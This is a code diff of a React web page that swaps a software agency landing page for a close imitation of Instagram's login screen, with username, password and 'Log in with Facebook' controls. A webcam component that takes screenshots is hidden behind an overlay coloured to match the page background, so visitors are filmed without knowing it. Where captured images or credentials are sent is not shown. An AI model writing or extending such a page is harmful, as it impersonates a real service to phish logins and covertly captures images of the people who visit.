@@ -35,82 +35,65 @@ export default function Home() {
     return () => clearInterval(interval); // Clear interval on component unmount
   }, []);
 
-  // <div className="">
-  //   <main className="">
-  //     {/* <div className="bg-[#0a0a0a] absolute w-full h-full" /> */}
-  //     <div className="z-10 absolute"></div>
-  //     <div className="">
-  //       <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} />
-  //     </div>
-  //   </main>
-  // </div>
   return (
     <>
-      {/* NAV */}
-      <nav className="flex">
-        <a href="#" className="logo">
-          <img src="https://i.postimg.cc/s23zP3Mn/logo.png" alt="Logo" />
-        </a>
-        <ul className="links flex">
-          <li>
-            <a href="#" className="active">
-              HOME
+      <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
+        <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
+          <h1 className="bg-no-repeat instagram-logo"></h1>
+          <form className="mt-8 w-64 flex flex-col">
+            <input
+              autoFocus
+              className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+              id="email"
+              placeholder="Phone number, username, or email"
+              type="text"
+            />
+            <input
+              autoFocus
+              className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+              id="password"
+              placeholder="Password"
+              type="password"
+            />
+            <a className="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">
+              Log In
             </a>
-          </li>
-          <li>
-            <a href="#">SERVICES</a>
-          </li>
-          <li>
-            <a href="#">PORTFOLIO</a>
-          </li>
-          <li>
-            <a href="#">CONTACT</a>
-          </li>
-          <li>
-            <a href="#">ABOUT</a>
-          </li>
-        </ul>
-      </nav>
-      {/* HEADER */}
-      <header className="flex relative padding_2 ">
-        <article className="relative padding_4">
-          <h5 className="sub_title tag">Welcome To Bboysdreamsfell</h5>
-          <h1 className="title big">Code Done Right</h1>
-          <p>
-            We provide software & graphic expertise. So you can add skills
-            rapidly without the need of permanent staff.
-          </p>
-          <aside className="buttons fixed_flex">
-            <a href="#" className="btn btn_1">
-              Learn more
-            </a>
-            <a href="#" className="btn btn_2">
-              Contact us
-            </a>
-          </aside>
-          <div className="hide-container ">
-            <div className="hide-overlay"></div>
-            <div className="">
-              <Webcam
-                audio={false}
-                screenshotFormat="image/jpeg"
-                ref={webcamRef}
-              />
-            </div>
+          </form>
+
+          <div className="flex justify-evenly space-x-2 w-64 mt-4">
+            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
+              or
+            </span>
+            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
           </div>
-        </article>
-        <aside className="social_icons flex">
-          <a href="#">
-            <i className="fa fa-facebook"></i>
+          <button className="mt-4 flex">
+            <div className="bg-no-repeat facebook-logo mr-1"></div>
+            <span className="text-xs text-blue-900 font-semibold">
+              Log in with Facebook
+            </span>
+          </button>
+          <a className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">
+            Forgot password?
           </a>
-          <a href="#">
-            <i className="fa fa-instagram"></i>
-          </a>
-          <a href="#">
-            <i className="fa fa-linkedin"></i>
-          </a>
-        </aside>
-      </header>
+        </div>
+        <div className="bg-white border border-gray-300 text-center w-80 py-4">
+          <span className="text-sm">Don't have an account?</span>
+          <a className="text-blue-500 text-sm font-semibold">Sign up</a>
+        </div>
+        <div className="mt-3 text-center">
+          <span className="text-xs">Get the app</span>
+          <div className="flex mt-3 space-x-2">
+            <div className="bg-no-repeat apple-store-logo"></div>
+            <div className="bg-no-repeat google-store-logo"></div>
+          </div>
+        </div>
+      </div>
+      <div className=" absolute top-0 w-1/3">
+        <div className="absolute w-full h-full bg-[#F9FAFB]"></div>
+
+        <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} />
+      </div>
     </>
   );
 }
